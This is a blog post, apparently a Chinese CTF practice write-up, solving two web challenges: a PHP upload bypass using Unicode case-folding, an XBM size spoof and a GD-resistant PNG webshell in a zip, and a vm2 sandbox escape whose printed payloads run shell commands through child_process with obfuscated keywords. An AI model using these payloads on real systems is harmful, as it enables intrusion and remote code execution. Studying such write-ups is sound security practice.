@@ -1,0 +1,269 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>web随缘刷 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">web随缘刷</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/">2022-05-19</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>唉，ciscn快开了，ctf太卷了，做做以前题练一下手吧</p>
+<p>[TOC]</p>
+<h1 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h1><p>源码:</p>
+<pre><code class="php">&lt;?php
+if (!isset($_GET[&quot;ctf&quot;])) &#123;
+    highlight_file(__FILE__);
+    die();
+&#125;
+
+if(isset($_GET[&quot;ctf&quot;]))
+    $ctf = $_GET[&quot;ctf&quot;];
+
+if($ctf==&quot;upload&quot;) &#123;
+    if ($_FILES[&#39;postedFile&#39;][&#39;size&#39;] &gt; 1024*512) &#123;
+        die(&quot;这么大个的东西你是想d我吗？&quot;);
+    &#125;
+    $imageinfo = getimagesize($_FILES[&#39;postedFile&#39;][&#39;tmp_name&#39;]);
+    if ($imageinfo === FALSE) &#123;
+        die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;);
+    &#125;
+    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;
+        die(&quot;东西不能方方正正的话就很讨厌&quot;);
+    &#125;
+    $fileName=urldecode($_FILES[&#39;postedFile&#39;][&#39;name&#39;]);
+    if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123;
+        die(&quot;有些东西让你传上去的话那可不得了&quot;);
+    &#125;
+    $imagePath = &quot;image/&quot; . mb_strtolower($fileName);
+    if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123;
+        echo &quot;upload success, image at $imagePath&quot;;
+    &#125; else &#123;
+        die(&quot;传都没有传上去&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>审计下这个代码，传一个文件，校验大小–&gt;校验图片高和宽–&gt;过滤’c’,’i’,’h’,’ph’–&gt;成功上传or失败</p>
+<p>无法上传php🐎，无法利用.htacess和.user.ini，</p>
+<p>那就</p>
+<p>扫描一下目录，又发现了一个源码</p>
+<p>example.php</p>
+<pre><code class="php"> &lt;?php
+if (!isset($_GET[&quot;ctf&quot;])) &#123;
+    highlight_file(__FILE__);
+    die();
+&#125;
+
+if(isset($_GET[&quot;ctf&quot;]))
+    $ctf = $_GET[&quot;ctf&quot;];
+
+if($ctf==&quot;poc&quot;) &#123;
+    $zip = new \ZipArchive();
+    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];
+    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;
+        die(&quot;要不咱们再看看？&quot;);
+    &#125;
+    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;
+        die (&quot;都不能解压呢&quot;);
+    &#125;
+
+    echo &quot;可以解压，我想想存哪里&quot;;
+    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);
+    $zip-&gt;extractTo($pos_for_zip);
+    $zip-&gt;close();
+    unlink($name_for_zip);
+    $files = glob(&quot;$pos_for_zip/*&quot;);
+    foreach($files as $file)&#123;
+        if (is_dir($file)) &#123;
+            continue;
+        &#125;
+        $first = imagecreatefrompng($file);
+        $size = min(imagesx($first), imagesy($first));
+        $second = imagecrop($first, [&#39;x&#39; =&gt; 0, &#39;y&#39; =&gt; 0, &#39;width&#39; =&gt; $size, &#39;height&#39; =&gt; $size]);
+        if ($second !== FALSE) &#123;
+            $final_name = pathinfo($file)[&quot;basename&quot;];
+            imagepng($second, &#39;example/&#39;.$final_name);
+            imagedestroy($second);
+        &#125;
+        imagedestroy($first);
+        unlink($file);
+    &#125;
+&#125;
+</code></pre>
+<p>这段代码的大致作用是解压一个zip文件，那我们就要思考是否可以把php放入zip中，那就需要我们上传一个zip文件，但是i被过滤</p>
+<p>这里可以利用mb_strtolower函数绕过，它是支持Unicode的</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123323158.png" alt="image-20220519123323158"></p>
+<p>大致的意思就是我们可以用一个字符Unicode去替换i</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123635184.png" alt="image-20220519123635184"></p>
+<pre><code class="php">&lt;?php
+var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
+?&gt;
+</code></pre>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123728624.png" alt="image-20220519123728624"></p>
+<p>详见:<a target="_blank" rel="noopener" href="https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/">https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/</a></p>
+<p>绕过了i之后我们还要绕过高和宽</p>
+<p>我们可以利用xmb绕过</p>
+<pre><code>#define test_width 1
+#define test_height 1
+</code></pre>
+<p>除此之外它还有一个函数过滤，阻止我们在图片中放入恶意的php</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519124806416.png" alt="image-20220519124806416"></p>
+<p>通常，系统在实现图片上传功能时，为了防范用户上传含有恶意 php 代码的图片，可采用 gd 库重建图片，gd 库重建图片的一系列函数 imagecreatefrom*，会检查图片规范，验证图片合法性，以此抵御图片中含有恶意 php 代码的攻击。</p>
+<p>如果直接在图片最后写一个一句话木马，会被GD库给去掉。绕过GD库可以参考这篇文章：<a target="_blank" rel="noopener" href="http://www.vuln.cn/6411">http://www.vuln.cn/6411</a></p>
+<p>我们可以使用工具:<a target="_blank" rel="noopener" href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator%E6%9D%A5%E5%B8%AE%E5%8A%A9%E6%88%91%E4%BB%AC%E7%BB%95%E8%BF%87">https://github.com/huntergregal/PNG-IDAT-Payload-Generator来帮助我们绕过</a></p>
+<p>使用脚本生成图片🐎</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125046671.png" alt="image-20220519125046671"></p>
+<p>修改后缀为php并放入zip中</p>
+<p>创建一个txt文件，里面写入</p>
+<pre><code>
+#define test_width 1
+#define test_height 1
+</code></pre>
+<p>注:第一行要空出来换行，不然无法识别</p>
+<p>然后将txt追加到zip后</p>
+<pre><code>copy shell.zip/b+1.txt/a dd.zip
+</code></pre>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130016829.png" alt="image-20220519130016829"></p>
+<p>然后就可以来上传了</p>
+<p>自己构建一个html post文件上传界面:</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;POST数据包POC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://05b1ebab-02ca-4b72-bf12-1b21695d609d.node4.buuoj.cn:81/upload.php?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;!--链接是当前打开的题目链接--&gt;
+    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125541638.png" alt="image-20220519125541638"></p>
+<p>抓包，修改i</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130133680.png" alt="image-20220519130133680"></p>
+<p>成功上传</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130059694.png" alt="image-20220519130059694"></p>
+<p>然后使用example页面解压</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519133936518.png" alt="image-20220519133936518"></p>
+<p>成功解压，运行下</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134029090.png" alt="image-20220519134029090"></p>
+<p>下面来找flag</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134213040.png" alt="image-20220519134213040"></p>
+<p>读取下这个文件</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134241496.png" alt="image-20220519134241496"></p>
+<h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519144418792.png" alt="image-20220519144418792"></p>
+<p>真的是php吗？</p>
+<p>既然这么提示了那肯定不是，测一下node.js</p>
+<p>传入 Error().stack</p>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519145031732.png" alt="image-20220519145031732"></p>
+<p>确实是js，是vm2的沙箱逃逸问题</p>
+<p>github有现成poc:</p>
+<pre><code class="js">&quot;use strict&quot;;
+const &#123;VM&#125; = require(&#39;vm2&#39;);
+const untrusted = &#39;(&#39; + function()&#123;
+    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
+    try&#123;
+        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
+    &#125;catch(e)&#123;
+        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
+    &#125;
+&#125;+&#39;)()&#39;;
+try&#123;
+    console.log(new VM().run(untrusted));
+&#125;catch(x)&#123;
+    console.log(x);
+&#125;
+</code></pre>
+<p>或者</p>
+<pre><code class="js">&quot;use strict&quot;;
+const &#123;VM&#125; = require(&#39;vm2&#39;);
+const untrusted = &#39;(&#39; + function()&#123;
+    try&#123;
+        Buffer.from(new Proxy(&#123;&#125;, &#123;
+            getOwnPropertyDescriptor()&#123;
+                throw f=&gt;f.constructor(&quot;return process&quot;)();
+            &#125;
+        &#125;));
+    &#125;catch(e)&#123;
+        return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
+    &#125;
+&#125;+&#39;)()&#39;;
+try&#123;
+    console.log(new VM().run(untrusted));
+&#125;catch(x)&#123;
+    console.log(x);
+&#125;
+</code></pre>
+<p>构造成function传入</p>
+<pre><code class="js">(function()
+ &#123;    
+    &quot;use strict&quot;;
+    const &#123;VM&#125; = require(&#39;vm2&#39;);
+    const untrusted = &#39;(&#39; + function()&#123;
+        TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
+        try&#123;
+            Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
+        &#125;catch(e)&#123;
+            return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
+        &#125;
+    &#125;+&#39;)()&#39;;
+    try&#123;
+        console.log(new VM().run(untrusted));
+    &#125;catch(x)&#123;
+        console.log(x);
+    &#125;
+&#125;)()
+</code></pre>
+<p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519150121586.png" alt="image-20220519150121586"></p>
+<p>应该关键字被过滤了</p>
+<p>绕过:</p>
+<p>1、在关键字字母上加上 `</p>
+<pre><code class="js">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+/flag`)[`toString`](); &#125; &#125;)()
+</code></pre>
+<p>2、javascript的模版文字绕过</p>
+<p>prototype变成`${`${`prototyp`}e`}`</p>
+<pre><code class="js">(function ()&#123;
+    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();
+    try&#123;
+        Object.preventExtensions(Buffer.from(``)).a = 1;
+    &#125;catch(e)&#123;
+        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();
+    &#125;
+&#125;)()
+</code></pre>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/">https://sakurahack-y.github.io/2022/05/19/web随缘刷/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/CTF/">CTF</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2021-Quals-upload"><span class="toc-number">1.</span> <span class="toc-text">[CISCN2021 Quals]upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HFCTF2020-JustEscape"><span class="toc-number">2.</span> <span class="toc-text">[HFCTF2020]JustEscape</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">redis未授权访问漏洞复现 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
